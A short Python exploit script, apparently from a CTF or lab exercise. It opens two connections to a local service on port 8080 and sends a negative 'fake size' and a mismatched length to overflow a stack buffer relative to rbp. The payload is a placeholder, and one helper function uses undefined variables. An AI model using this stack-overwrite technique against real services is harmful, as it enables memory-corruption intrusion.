i2b = lambda i: int.to_bytes(i, 8, 'little', signed=True)

import socket

def snd():
    s.send(int.to_bytes(N, 8, 'little'))
    s.send(b'\x00'*N)
def deliver_payload(offset, payload):
    """
    Deliver payload starting at rbp-offset

    Actual payload always starts from rbp-64.
    Payload length has to be multiple of 16.

    size_s determines the location of the buffer.
    using 0 starts the buffer at rbp-64

    """

    size_s = 0 - (offset - (-64)) # 64 writes all the way to rbp


    size_l = len(payload)

    import socket
    a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    a.connect(('localhost', 8080))

    b = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    b.connect(('localhost', 8080))


    a.send(i2b(size_s)) # main thread alloccates small buf
    print('done sending fake size')
    b.send(i2b(size_l)) # antihelper preps main to recv large buf
    print('done sending true size')
    a.send(payload)
    print('done sending payload')
    b.send(b'\x00'*size_l)
    print('done sending ... this isnt really meaningful')

    ar = a.recv(size_l)
    print('done receiving a; got: {}'.format(ar))
    br = b.recv(size_l)
    print('done receiving b; got: {}'.format(br))
    print("ar: {} \n br: {} \n".format(ar, br))

payload = b'\xfc'*8
deliver_payload(-64, payload)

